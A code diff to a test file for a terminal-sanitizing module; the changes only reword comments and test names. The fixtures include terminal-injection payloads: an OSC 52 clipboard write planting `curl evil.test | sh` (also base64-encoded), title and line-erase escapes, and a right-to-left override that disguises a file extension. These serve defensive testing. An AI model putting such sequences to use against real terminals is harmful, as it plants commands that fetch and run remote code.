@@ -1,7 +1,7 @@
 /**
  * `clip.ts`: somebody else's words, made safe for the terminal of the person running the command.
  *
- * THE CASES ARE THE AUDIT'S BYTES, NOT INVENTED ONES. Audit thirty-seven finding 3 measured a `set_var` answer carrying
+ * THE CASES ARE A REAL ATTACK'S BYTES, NOT INVENTED ONES. A `set_var` answer was measured carrying
  * OSC 52 (a clipboard write of `curl evil.test | sh`), OSC 0 (a window title) and CR plus CSI 2K (erase the line) all the
  * way to `automations show`'s output. The eight-bit spellings are here because the copies this module replaced in
  * `brief.ts` and `session.ts` stopped at U+001F and let U+009B and U+009D through, measured by running this file against
@@ -19,7 +19,7 @@ const SHOWN = 'Invoice 7 ]52;c;Y3VybCBldmlsLnRlc3QgfCBzaA== ]0;BrainDog: all cle
 /** Every control character a printed line could carry, C0, DEL and C1 alike. */
 const CONTROL = /[\u0000-\u001f\u007f-\u009f]/;
 
-test('oneLine: the audit row loses every ESC, BEL and CR, and keeps every printable character where it was', () => {
+test('oneLine: the hostile row loses every ESC, BEL and CR, and keeps every printable character where it was', () => {
   assert.equal(oneLine(HOSTILE), SHOWN);
   assert.equal(CONTROL.test(oneLine(HOSTILE)), false);
 });
@@ -51,15 +51,15 @@ test('printable: every string at any depth is one clean line, and numbers, boole
 });
 
 /*
- * AUDIT THIRTY-NINE FINDING 11. Every control character (Unicode's Cc) was gone and no format character (Cf) was: the
- * audit's `clip.mts` printed PASSES for U+202E, the isolates, U+200F, U+061C, U+200B, U+2060, U+00AD, a tag character
+ * FORMAT CHARACTERS GO TOO, NOT ONLY CONTROLS. Every control character (Unicode's Cc) was gone and no format
+ * character (Cf) was: a probe printed PASSES for U+202E, the isolates, U+200F, U+061C, U+200B, U+2060, U+00AD, a tag character
  * and U+FFF9, and this file run against the old class failed on each. None of them tells a terminal to do anything, but
  * a terminal that lays text out both ways (VTE, Konsole, mlterm) draws `invoice U+202E fdp.exe` as `invoiceexe.pdf`.
  */
 const u = (n: number): string => String.fromCodePoint(n);
 const FORMAT = [0x061c, 0x200b, 0x200e, 0x200f, 0x202a, 0x202b, 0x202c, 0x202d, 0x202e, 0x2060, 0x2066, 0x2067, 0x2068, 0x2069, 0x00ad, 0xfff9, 0xfffa, 0xfffb, 0xe0000, 0xe0041, 0xe007f];
 
-test('oneLine: every bidirectional control and invisible character the audit named is taken out, and the word is left whole', () => {
+test('oneLine: every bidirectional control and invisible character a terminal can be tricked by is taken out, and the word is left whole', () => {
   for (const n of FORMAT) {
     const hex = n.toString(16).toUpperCase().padStart(4, '0');
     assert.equal(oneLine(`co${u(n)}op`), 'coop', `U+${hex} got through`);
@@ -73,7 +73,7 @@ test('oneLine: the zero width joiner stays, because a family or a rainbow flag i
 });
 
 /*
- * THE AUDIT'S CHECKER SAW `clip cuts a surrogate pair: true`, and it was real: `slice` counts UTF-16 units, so an emoji
+ * A PROBE SAW `clip cuts a surrogate pair: true`, and it was real: `slice` counts UTF-16 units, so an emoji
  * straddling the cut left its high half on the line, which a terminal draws as a replacement box or, in some, an error.
  */
 test('clip: never cuts a character in half, so an emoji at the cut is kept whole or left out whole', () => {
